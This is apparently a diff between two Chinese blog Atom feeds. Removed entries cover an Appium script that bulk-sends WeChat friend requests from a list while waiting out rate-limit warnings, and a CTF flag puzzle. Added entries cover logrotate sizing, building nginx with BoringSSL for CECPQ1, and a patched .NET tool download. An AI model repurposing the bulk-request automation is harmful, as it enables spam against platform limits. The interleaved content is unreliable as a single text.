-<p>AppiumDriver(Client) 可以很方便的获得当前正在运行的Activity的UI描述，随后可根据返回的XML文档来寻找元素。</p>
-<pre class="lang:python decode:true">print dr.page_source</pre>
-<p><a href="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062.jpg"><img class="alignnone size-medium wp-image-108" src="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-300x178.jpg" alt="getSource" width="300" height="178" srcset="https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-300x178.jpg 300w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-768x456.jpg 768w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062-1024x608.jpg 1024w, https://www.summershrimp.com/wp-content/uploads/2016/08/2014100408573062.jpg 1261w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
-<p>(图片与他人，侵删)</p>
-<p>确定元素位置后，即可根据前述的Find方法来查找/选择元素</p>
-<h2>编写完整的测试代码</h2>
-<p>正确的获取元素之后便可以获取元素相关的信息，随后使用各语言常用的测试框架编写测试即可，如Java的JUnit，Nodejs的Mocha等。</p>
-<p>这里我使用Appium主要是为了模拟用户点击添加微信好友，所以完整的程序并没有使用到测试框架。相关的UI元素获取/操作方法供大家参考。</p>
-<pre class="lang:python decode:true "># coding:utf-8
-from appium import webdriver
-from time import sleep
+<p>如果发现日志滚动后 nginx 依旧在向 access.log.1 中写入日志，而新创建的 access.log 大小始终是0，那么请将上文中的 postrotate 代码改为：</p>
+<pre class="brush: bash; title: ; notranslate">
 
+service nginx rotate &gt;/dev/null 2&gt;&amp;1
 
-def addFriend(dr, id, dryRun=False):
-    succ = False
-    wechatId = str(id)
-    dr.find_element_by_accessibility_id(r"更多功能按钮").click()
-    item_list = dr.find_elements_by_class_name("android.widget.LinearLayout")
-    try:
-        item_list[2].click()
-    except:
-        print "Error! in item list len"
-        return succ
-    el = dr.find_element_by_class_name("android.widget.ListView")
-    item_list = el.find_elements_by_class_name("android.widget.LinearLayout")
-    try:
-        item_list[1].click()
-    except:
-        print "Error! in item list len"
-        return succ
-    t = dr.find_element_by_id("com.tencent.mm:id/f7")
-    t.send_keys(wechatId)
-    search = dr.find_element_by_id("com.tencent.mm:id/aqw").find_element_by_class_name("android.widget.RelativeLayout")
-    search.click()
-    try:
-        freq = dr.find_element_by_id('com.tencent.mm:id/aqq')
-        assert freq.text == u"操作过于频繁，请稍后再试。"
-        print "Frequency too high! Sleep 300s"
-        sleep(60)
-        return succ
-    except:
-        pass
-
-    try:
-        dr.find_element_by_id('com.tencent.mm:id/a8x').click()
-        addBtn = dr.find_element_by_id('com.tencent.mm:id/eu')
-        if not dryRun:
-            addBtn.click()
-            succ = True
-        print "Success Send Requests:" + wechatId
-    except:
-        print "No Such User Or Already a Friend:" + wechatId
-
-    while True:
-        try:
-            dr.find_element_by_id('com.tencent.mm:id/fb').click()
-        except:
-            try:
-                dr.find_element_by_id('com.tencent.mm:id/f4').click()
-            except:
-                break
-    return True
-
-def resetActivity(dr, desired_caps):
-    dr.start_activity(desired_caps['appPackage'], desired_caps['appActivity'])
-
-desired_caps = {}
-desired_caps['platformName'] = 'Android'
-desired_caps['platformVersion'] = '5.1'
-desired_caps['deviceName'] = 'm3_note'
-desired_caps['appPackage'] = 'com.tencent.mm'
-desired_caps['appActivity'] = '.ui.LauncherUI'
-print "Trying connect to phone..."
-dr = {}
-try:
-    dr = webdriver.Remote('http://localhost:4723/wd/hub', desired_caps)
-except Exception, e:
-    print "Cannot Connect to phone :", e
-    exit()
-print "Successfully connect to phone."
-print "Reading friend list..."
-friendList = []
-fp = open("friends.txt")
-line = fp.readline().strip()
-while line:
-    friendList.append(line)
-    line = fp.readline().strip()
-print "Finish reading friends. Total: " + str(len(friendList))
-print "Wait for Wechat's splash screen...."
-for i in range(0, 10):
-    print 10 - i
-    sleep(1)
-succ_list = []
-fail_list = []
-for i in friendList:
-    try:
-        succ = addFriend(dr, i, dryRun=False)
-        if succ:
-            succ_list.append(i)
-        else:
-            fail_list.append(i)
-    except:
-        fail_list.append(i)
-        resetActivity(dr, desired_caps)
-
-print "Succeed List:"
-print "\n".join(succ_list)
-print "Failed List:"
-print "\n".join(fail_list)
-
-dr.close()</pre>
-<p>&nbsp;</p>]]></content>
+</pre>
+<h1>划重点</h1>
+<p>同学A：慢着！刚刚不是说你服务器跑的 Ubuntu Server 默认启用了 logrotate 么？那么为什么你的硬盘还是被这些日志文件吃了个精光呢？按说一共就保留14份日志，也就只有14天的份，还都是压缩过的，怎么会占用这么多呢？</p>
+<p>我：<del>谢尔曼M1，坐！</del></p>
+<p>问题来了，这个 logrotate 的默认配置文件，少了 <em>maxsize 100M</em> 这一行，也就是说如果说在第二天的滚动开始前，日志就已经占用了过大的空间，以至于剩余空间不足以储存对应日志的压缩文件（因为得先压缩完才能删除原始文件，于是整个过程所需的最大空间是 <em>原始文件体积+压缩后的体积</em>，毕竟不可能一边压缩一边删除原始文件嘛）的话，整个日志滚动就会失败。而我的实际情况就是 access.log.0 文件占用了13G的空间（剩下的13个压缩后的日志一共才1G不到，完美的体现了压缩的好处），剩余的空间不足以对其进行压缩，于是整个日志滚动彻底失效了。</p>
+<p>当然了，理想的情况下，如果能够将其设置成全部日志加起来的体积超过一个临界点（比如日志一共5G）那么就自动删除最老的一份日志，那是坠吼嘀！然而 logrotate 并没有提供这样的整体体积限制的功能，于是只好用一些小技巧。注意这两行：</p>
+<pre class="brush: bash; title: ; notranslate">
+rotate 14 # 最多保留14次滚动，超过则删除最老的日志
+maxsize 100M # 重要！活动日志的最大尺寸，超过该尺寸则强制滚动一次
+</pre>
+<p>通过限制活动日志的体积（也就是尾号是0或者没有后缀的那个日志文件）和保留日志滚动数量，我们能够限制整体的日志大小，也即不超过 14 * 100M = 1.4G。当然这样的缺点就是如果某一天的日志特别多，那么那一天的日志会被拆分成多个（课外题：自行百度，将日志文件后缀设置为当前的日期时间）。</p>
+<h1>总结</h1>
+<p>不限制日志体积真是坑啊！</p>
+<p><a rel="nofollow" href="https://www.noisyfox.io/logrotate.html">Logrotate 日志滚动 解决日志占用空间过大</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
         <author>
-            <name><![CDATA[0xe799bde88f9c]]></name>
+            <name><![CDATA[狐狸的小小窝]]></name>
         </author>
     </entry>
     
     <entry>
-        <id>https://www.summershrimp.com/2016/04/nuaactf/</id>
-        <title><![CDATA[095a655fc809cbbdffa207717a5233f5的原文是什么？]]></title>
-        <updated>2016-04-19T02:47:11+08:00</updated>
-        <link href="https://www.summershrimp.com/2016/04/nuaactf/"/>
-        <content type="text/html" src="https://www.summershrimp.com/2016/04/nuaactf/"><![CDATA[<p>095a655fc809cbbdffa207717a5233f5的原文是</p>
-<pre class="lang:default decode:true ">bnVhYWN0ZiU3Qi93ZWIyL2NlYmE2ZmJiZjBlZGU0MzI1MjY0MWNkMzM2ZTM2YTAzJTdE</pre>
-<p>Happy NUAACTF!</p>]]></content>
+        <id>https://www.noisyfox.io/cecpq1-nginx-boringssl.html</id>
+        <title><![CDATA[Use CECPQ1 On Your Website with Nginx & BoringSSL]]></title>
+        <updated>2016-09-13T06:38:13+08:00</updated>
+        <link href="https://www.noisyfox.io/cecpq1-nginx-boringssl.html"/>
+        <content type="text/html" src="https://www.noisyfox.io/cecpq1-nginx-boringssl.html"><![CDATA[<h2>Deprecated / 已弃用</h2>
+<p>In 2016, the experimental use in Chrome ended and it was planned to disable CECPQ1 in a later Chrome update.</p>
+<p>CECPQ1的实验已经结束，目前的chrome stable已经移除了对其的支持。</p>
+<hr />
+<h2>What is CECPQ1</h2>
+<p>CECPQ1 是谷歌提出的一种“<a href="https://en.wikipedia.org/wiki/Post-quantum_cryptography" target="_blank" rel="noopener noreferrer">后量子时代</a>”的密钥交换算法。</p>
+<p>所谓的后量子时代算法，大意是说该算法难以被将来可能出现的量子计算机轻易破解。<br />
+而目前常用的非对称加密/密钥交换算法的安全性大多依赖于大数分解以及逆推椭圆曲线的难度。而这些问题可能对于量子计算机来说可以轻松解决。故而需要一种新的加密原理来对抗量子计算机的威胁。</p>
+<p>当然将来能不能制造出大型的量子计算机并破解现有的加密算法依旧是个未知数。<a href="https://community.letsencrypt.org/t/google-is-experimenting-with-post-quantum-crypto-for-tls/17720" target="_blank" rel="noopener noreferrer">不过谷歌在前段时间开始已经在自己的 chrome 以及服务器上启用了该密钥交换算法</a>，使用 Chrome 54+ 访问谷歌的服务，可以看到类似下图的结果：<br />
+<a href="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQ截图20160913150853.png"><img class="aligncenter size-full wp-image-416" src="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQ截图20160913150853.png" alt="CECPQ1 on Google" width="642" height="401" /></a></p>
+<p>其中的“CECPQ1_ECDSA”即表明了其采用了 CECPQ1 密钥交换 + ECDSA 签名算法。</p>
+<p>当然纯粹是好玩，我也装修了一下我的小窝，让它也支持了这种厉害的算法~<br />
+<a href="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQ截图20160913151547.png"><img class="aligncenter size-full wp-image-418" src="https://www.noisyfox.cn/wp-content/uploads/2016/09/QQ截图20160913151547.png" alt="CECPQ1 on Noisyfox" width="642" height="401" /></a></p>
+<p>不过由于我的证书是 RSA 签名的，故图中采用的是“CECPQ1_RSA”而不是 ECDSA。</p>
+<p>如果你也想让自己的网站支持这种算法，那么就跟着狐狸我一步一步来配置你的网站吧~</p>
+<hr />
+<h2>教程环境</h2>
+<ul>
+<li>Ubuntu 14.04.4 LTS</li>
+<li>nginx-1.10.1</li>
+<li>BoringSSL</li>
+</ul>
+<p>由于目前仅有 BoringSSL 支持 CECPQ1 算法，故我们需要自行采用 BoringSSL 来编译 nginx。</p>
+<p>对于 Debian 用户，以及 Ubuntu 14.04 之前的用户，可以采用<a href="https://github.com/ajhaydock/BoringNginx" target="_blank" rel="noopener noreferrer">BoringNginx</a>项目来一键编译、安装。</p>
+<p>对于 Ubuntu 14.04 及以后的用户，由于 Ubuntu 采用了 Systemd 替换了 upstart，故 BoringNginx 脚本会出问题。同时 BoringNginx 要求脚本必须在非 root 用户下执行，这对于大部分习惯用 root 用户来配置服务器的用户来说十分不便，故需采用手动编译、安装。</p>
+<hr />
+<h2>编译 BoringSSL &amp; Nginx</h2>
+<p><em>注：该部分教程参考了 Jerry Qu 《<a href="https://imququ.com/post/optimize-ssl-ciphers-with-boringssl.html" target="_blank" rel="noopener noreferrer">使用 BoringSSL 优化 HTTPS 加密算法选择</a>》一文，在此表示感谢。</em></p>
+<p>首先建立一个文件夹，并下载 Nginx 和 BoringSSL 源码。</p>
+<p>Nginx 从 1.7.4 开始支持 BoringSSL，这里我使用的是最新的稳定版 Nginx：</p>
+<pre class="brush: bash; title: ; notranslate">
+mkdir nginx &amp;&amp; cd nginx
+wget http://nginx.org/download/nginx-1.10.1.tar.gz
+tar xzf nginx-1.10.1.tar.gz
+
+git clone https://boringssl.googlesource.com/boringssl
+</pre>
+<p>现在你的 nginx 文件夹里应该会有这两个子目录：</p>
+<pre class="brush: bash; title: ; notranslate">
+boringssl/
+nginx-1.10.1/
+</pre>
+<p>接下来还需要做一些准备工作：</p>
+<pre class="brush: bash; title: ; notranslate">
+# 安装编译 BoringSSL 所需的 Golang 和 cmake
+sudo apt-get install golang cmake
+
+# 安装编译 Nginx 所需的工具和依赖库
+sudo apt-get install build-essential libpcre3 libpcre3-dev zlib1g-dev
+
+# 忽略编译过程中的 Warning（不加这个，编到一半会因为 Warning 太多无法继续）
+export CFLAGS=&quot;-Wno-error&quot;
+</pre>
+<p>随后编译 BoringSSL：</p>
+<pre class="brush: bash; title: ; notranslate">
+# 进入 BoringSSL 源码根目录
+cd boringssl
+
+# 创建 build 目录并编译，完成后回到 BoringSSL 源码根目录
+mkdir build &amp;&amp; cd build &amp;&amp; cmake ../ &amp;&amp; make &amp;&amp; cd ../
+
+# 创建 .openssl 目录，并将库文件和编译后的文件放进去
+mkdir -p .openssl/lib &amp;&amp; cd .openssl &amp;&amp; ln -s ../include . &amp;&amp; cd ../
+cp build/crypto/libcrypto.a build/ssl/libssl.a .openssl/lib
+
+cd ../
+</pre>
+<p>然后就可以用 BoringSSL 来编译 Nginx 了：</p>
+<pre class="brush: bash; title: ; notranslate">
+# 进入 Nginx 源码根目录
+cd nginx-1.10.1
+
+# 指定使用 BoringSSL 作为 SSL 库
+# 这里的参数比原文要多了许多，是为了兼容采用 apt 安装的 Nginx 的配置
+./configure --with-openssl=../boringssl \
+--prefix=/usr/share/nginx \
+--sbin-path=/usr/sbin/nginx \
+--conf-path=/etc/nginx/nginx.conf \
+--error-log-path=/var/log/nginx/error.log \
+--http-log-path=/var/log/nginx/access.log \
+--pid-path=/run/nginx.pid \
+--lock-path=/run/lock/subsys/nginx \
+--user=www-data \
+--group=www-data \
+--with-threads \
+--with-file-aio \
+--with-ipv6 \
+--with-http_ssl_module \
+--with-http_v2_module \
+--with-http_realip_module \
+--with-http_gunzip_module \
+--with-http_gzip_static_module \
+--with-http_slice_module \
+--with-http_stub_status_module \
+--without-select_module \
+--without-poll_module \
+--without-mail_pop3_module \
+--without-mail_imap_module \
+--without-mail_smtp_module
+
+# 修改时间，避免 Nginx 再次编译 BoringSSL
+touch ../boringssl/.openssl/include/openssl/ssl.h
+</pre>
+<p>然后就可以开始编译 Nginx 了， 直接执行：</p>
+<pre class="brush: bash; title: ; notranslate">
+make
+</pre>
+<p>一切正常的话，即可在 objs 目录里找到编译好的 Nginx。<br />
+执行：</p>
+<pre class="brush: bash; title: ; notranslate">
+cd objs
+./nginx -V
+</pre>
+<p>应该可以看到类似这样的输出：</p>
+<pre class="brush: bash; title: ; notranslate">
+nginx version: nginx/1.10.1
+built with OpenSSL 1.0.2 (compatible; BoringSSL) (running with BoringSSL)
+TLS SNI support enabled
+configure arguments: --with-openssl=../boringssl --prefix=/usr/share/nginx --sbin-path=/usr/sbin/nginx --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/run/nginx.pid --lock-path=/run/lock/subsys/nginx --user=www-data --group=www-data --with-threads --with-file-aio --with-ipv6 --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_slice_module --with-http_stub_status_module --without-select_module --without-poll_module --without-mail_pop3_module --without-mail_imap_module --without-mail_smtp_module
+</pre>
+<p>表明编译成功了。下面我们要将该 Nginx 安装至系统中。</p>
+<hr />
+<h2>安装 Nginx with BoringSSL</h2>
+<p>由于配置服务需要一些额外的知识，因此为了简单起见，我采用了 <em>使用 apt 安装原版 Nginx 然后替换可执行文件</em> 的方式来简化安装和服务的配置。这也是为什么在上文中我建议使用和 apt 安装的 Nginx 相仿的配置来编译自己的 Nginx。</p>
+<p>首先用 apt 来安装原版 Nginx：</p>
+<pre class="brush: bash; title: ; notranslate">
+# 从 Ubuntu 16.04 开始系统自带源的 nginx 就是1.10 版本的
+apt-get install nginx
+</pre>
+<p>或者</p>
+<pre class="brush: bash; title: ; notranslate">
+# 先添加 Nginx 官方软件源
+add-apt-repository ppa:nginx/stable
+apt-get update
+apt-get install nginx
+</pre>
+<p>然后替换原版 Nginx 为我们自己编译的版本：</p>
+<pre class="brush: bash; title: ; notranslate">
+# 先停止 Nginx 服务
+service nginx stop
+
+# 备份原版可执行文件
+cp /usr/sbin/nginx  ./nginx.bak
+
+# 替换 Nginx 可执行文件
+cp nginx /usr/sbin/nginx
+
+# 删除 Nginx 默认的 modules， 否则可能启动时报二进制不兼容的错误
+rm /etc/nginx/modules-enabled/*
+</pre>
+<p>这样一来，就成功的将系统中的 Nginx 替换为我们自己编译的版本，同时又保留了原版的服务控制方式，非常方便。</p>
+<hr />
+<h2>配置 Cipher Suite</h2>
+<p>在这里假定你已经知道如何配置 Nginx + SSL 了，如果不会，请百度或者谷歌一下。</p>
+<p>为了启用 CECPQ1 算法，需要配置正确的 Cipher Suit：</p>
+<pre class="brush: plain; title: ; notranslate">
+ssl_ciphers &quot;[CECPQ1-ECDSA-AES256-GCM-SHA384|CECPQ1-ECDSA-CHACHA20-POLY1305-SHA256]:[CECPQ1-RSA-AES256-GCM-SHA384|CECPQ1-RSA-CHACHA20-POLY1305-SHA256]:[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305-SHA256]:[ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305-SHA256]:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES256-SHA:ECDHE-RSA-AES256-SHA:RSA-AES128-GCM-SHA256:RSA-AES256-GCM-SHA384:RSA-AES128-SHA:RSA-AES256-SHA:RSA-3DES-EDE-SHA&quot;;
+ssl_prefer_server_ciphers on;
+</pre>
+<p>其中最先出现的几个以“CECPQ1”开头的算法就是本文提到的算法。<br />
+关于该 Cipher Suite 的格式和意思，也请参考《<a href="https://imququ.com/post/optimize-ssl-ciphers-with-boringssl.html" target="_blank" rel="noopener noreferrer">使用 BoringSSL 优化 HTTPS 加密算法选择</a>》一文。</p>
+<p>同时我们编译出的 Nginx 是支持 HTTP/2 以及 ALPN 的，在你的配置里写上：</p>
+<pre class="brush: plain; title: ; notranslate">
+listen 443 ssl http2;
+</pre>
+<p>即可启用最新最炫酷的 h2 啦！<br />
+（当然谷歌又弄了个 QUIC 协议，目前不太容易在 Nginx 上实现，残念。）</p>
+<hr />
+<h2> 结束</h2>
+<p>这篇教程到这里就结束啦~如果各位读者老爷发现有什么错误或不当之处，还请回复指正~</p>
+<p>也欢迎各位共同探讨相关技术~</p>
+<p><a rel="nofollow" href="https://www.noisyfox.io/cecpq1-nginx-boringssl.html">Use CECPQ1 On Your Website with Nginx &#038; BoringSSL</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
         <author>
-            <name><![CDATA[0xe799bde88f9c]]></name>
+            <name><![CDATA[狐狸的小小窝]]></name>
+        </author>
+    </entry>
+    
+    <entry>
+        <id>https://www.noisyfox.io/unmanaged-exports.html</id>
+        <title><![CDATA[Unmanaged Exports 修正版 .NET导出非托管函数]]></title>
+        <updated>2016-06-19T07:05:21+08:00</updated>
+        <link href="https://www.noisyfox.io/unmanaged-exports.html"/>
+        <content type="text/html" src="https://www.noisyfox.io/unmanaged-exports.html"><![CDATA[<p>Unmanaged Exports 是一个将.NET编写的静态托管函数导出成可供C/C++等直接调用的非托管函数的工具。</p>
+<hr />
+<h2>它是如何工作的？</h2>
+<p>创建一个新的或者修改已经存在的类库。<br />
+然后加入 UnmanagedExports <a href="https://nuget.org/packages/UnmanagedExports" target="_blank">Nuget 包</a>。<br />
+这基本就是所有要做的事情了。<br />
+然后你就可以随便写一些静态方法，用[DllExport]装饰它，然后在原生代码中使用了。<br />
+它很像 DllImport，你可以用MarshalAsAttribute来定义该函数的参数和结果的格式。<br />
+在编译时，这个工具会自动修改IL代码增加导出声明。</p>
+<h2>限制</h2>
+<ul>
+<li>你不能导出在同一个class中的重载函数，即便你指定了不同的导出名称。</li>
+<li>另一个限制是你不能递归调用导出函数。</li>
+</ul>
+<p>这看起来是运行时的限制，并且我并不想为了规避这些限制而再把你的函数做一次包装。</p>
+<hr />
+<p>首先用C#（其它.NET语言也可）创建一个windows经典桌面dll，然后在Nuget中搜索并安装Unmanaged Exports这个包。</p>
+<p>随后编写你要导出的静态函数，并添加[DllExport]注解，范例如下：</p>
+<p><pre data-enlighter-language="csharp" class="EnlighterJSRAW">
+class Test
+{
+  [DllExport(&quot;add&quot;, CallingConvention = CallingConvention.Cdecl)]
+  public static int TestExport(int left, int right)
+  {
+     return left + right;
+  } 
+}
+</pre></p>
+<p>然后生成平台选择一个具体的平台（不能是AnyCPU否则该工具不生效），生成解决方案即可。<br />
+该工具最新版只支持vs2008以后的vs，因为vs2008及以前的版本不支持nuget。</p>
+<hr />
+<p>工具官方网站及详细说明：<br />
+<a href="https://sites.google.com/site/robertgiesecke/Home/uploads/unmanagedexports" target="_blank">https://sites.google.com/site/robertgiesecke/Home/uploads/unmanagedexports</a></p>
+<hr />
+<p>关于编译错误<br />
+该工具在非英文操作系统上可能会出现编译错误的问题，具体表现如下：<br />
+<a href="http://stackoverflow.com/questions/20288469/cant-create-unmanaged-dll-using-c-sharp-and-robert-gieseckes-unmanaged-exports" target="_blank">http://stackoverflow.com/questions/20288469/cant-create-unmanaged-dll-using-c-sharp-and-robert-gieseckes-unmanaged-exports</a><br />
+<a href="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQ截图20160619143947.png"><img class="aligncenter size-full wp-image-402" src="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQ截图20160619143947.png" alt="Unmanaged Exports 编译错误" width="1452" height="90" /></a><br />
+主要原因是因为非英文操作系统中IL代码中含有非英文注释导致插件工作异常。<br />
+虽然将系统语言切换成英文可以解决这个问题，但是这个方法过于麻烦，故本人修改了这个工具，修正了其在非英文操作系统上不能正常使用的问题。</p>
+<p>文末附上修改后的文件，解压后将其中的两个dll替换进项目NuGet包中packages\UnmanagedExports.1.2.7\tools文件夹下的两个同名dll即可。<br />
+改修正版仅针对Unmanaged Exports 1.2.7版本制作，其它版本未测，可能不能正常使用。<br />
+替换完成后即可正常编译：<br />
+<a href="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQ截图20160619145913.png"><img class="aligncenter size-full wp-image-403" src="https://www.noisyfox.cn/wp-content/uploads/2016/06/QQ截图20160619145913.png" alt="Unmanaged Exports 编译正常" width="662" height="65" /></a><br />
+<div class="sdm_download_item "><div class="sdm_download_item_top"><div class="sdm_download_thumbnail"></div><div class="sdm_download_title">DllExport-Fixed-1.2.7.7z</div></div><div style="clear:both;"></div><div class="sdm_download_description"><p>修正了非英文系统编译错误的Unmanaged Exports 1.2.7</p>
+<h1></h1>
+</div><div class="sdm_download_link"><span class="sdm_download_button"><a href="https://www.noisyfox.io/?smd_process_download=1&download_id=404" class="sdm_download green" title="DllExport-Fixed-1.2.7.7z" target="_blank">Download Now!</a></span><span class="sdm_download_item_count"><span class="sdm_item_count_number">840</span><span class="sdm_item_count_string"> Downloads</span></span></div></div><div class="sdm_clear_float"></div></p>
+<p><a rel="nofollow" href="https://www.noisyfox.io/unmanaged-exports.html">Unmanaged Exports 修正版 .NET导出非托管函数</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
+        <author>
+            <name><![CDATA[狐狸的小小窝]]></name>
         </author>
     </entry>
     
